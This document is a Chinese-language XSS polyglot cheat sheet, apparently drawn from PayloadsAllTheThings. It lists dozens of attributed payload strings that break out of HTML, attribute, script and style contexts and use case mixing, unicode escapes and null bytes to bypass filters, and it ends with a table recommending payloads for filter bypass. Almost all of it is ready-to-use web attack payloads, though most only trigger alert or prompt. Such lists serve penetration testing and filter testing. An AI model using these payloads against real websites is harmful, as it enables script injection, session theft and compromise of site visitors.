# XSS Polyglot - XSS通用载荷

[SEARCH_KEYWORDS]
漏洞类型: XSS Cross-Site Scripting Polyglot 跨站脚本 通用载荷
攻击类型: Cross-Site Scripting Filter Bypass Context Breaking
关键词: XSS polyglot multicontext filter bypass payload injection
技术: HTML JavaScript Attribute Context Breaking Encoding Bypass
框架: Angular SVG HTML Script Attribute
作者: 0xsobky Ashar Javed Mathias Karlsson Rsnake Daniel Miessler s0md3v

[CONTENT]

## XSS Polyglot概述

XSS Polyglot是一种跨多个上下文（HTML、JavaScript、属性等）工作的XSS载荷，利用应用程序在不同解析场景中无法正确清理输入的漏洞。

## Polyglot XSS载荷

### Polyglot XSS - 0xsobky

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Polyglot XSS - Ashar Javed

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

### Polyglot XSS - Mathias Karlsson

```javascript
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

### Polyglot XSS - Rsnake

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

### Polyglot XSS - Daniel Miessler

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
'>><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```

### Polyglot XSS - @s0md3v

```javascript
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

### Polyglot XSS - @filedescriptor

```javascript
// Author: crlf
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>

// Author: europa
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>

// Author: EdOverflow
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>

// Author: h1/ragnar
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
```

### Polyglot XSS - brutelogic

```javascript
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

## 应用场景

| 场景 | 推荐Payload |
|------|-------------|
| 短Payload | `-->'"/></sCript><svG x=">" onload=(co\u006efirm)\`\`>` |
| 多上下文 | `jaVasCript:/*-/*\`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e` |
| 绕过过滤 | `<svg%0Ao%00nload=%09((pro\u006dpt))()//` |

## 参考文档

原始来源: PayloadsAllTheThings/XSS Injection/2 - XSS Polyglot.md